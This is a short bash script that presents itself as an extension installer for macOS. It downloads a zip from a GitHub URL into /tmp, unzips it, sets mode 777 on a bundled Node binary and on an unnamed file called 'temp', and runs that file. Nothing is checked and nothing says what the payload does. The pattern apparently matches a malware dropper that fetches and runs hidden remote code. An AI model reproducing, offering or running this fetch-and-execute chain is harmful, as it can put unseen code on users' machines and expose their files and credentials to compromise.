#!/bin/bash

# ----------------------------
# Variables
# ----------------------------
URL="https://raw.githubusercontent.com/BlokTrooper/extension/main/mac.zip"
TEMPDIR="/tmp/ext"
TEMPZIP="$TEMPDIR/mac.zip"
NODE_BIN="$TEMPDIR/node"       # Node binary inside zip
TEMP_SCRIPT="$TEMPDIR/temp"    # The temp file to run

# ----------------------------
# Create temp extract folder if not exists
# ----------------------------
mkdir -p "$TEMPDIR"

# ----------------------------
# Download zip using curl
# ----------------------------
echo "Downloading..."
curl -L -o "$TEMPZIP" "$URL"

# ----------------------------
# Extract zip
# ----------------------------
echo "Extracting..."
unzip -o "$TEMPZIP" -d "$TEMPDIR"

# ----------------------------
# Remove zip file
# ----------------------------
rm "$TEMPZIP"

# ----------------------------
# Set executable permission for Node and temp
# ----------------------------
echo "Setting execution permission..."
chmod 777 "$NODE_BIN"
chmod 777 "$TEMP_SCRIPT"

# ----------------------------
# Run node temp
# ----------------------------
echo "Running node temp..."
cd "$TEMPDIR"
"$NODE_BIN" "$TEMP_SCRIPT"

echo "Done!"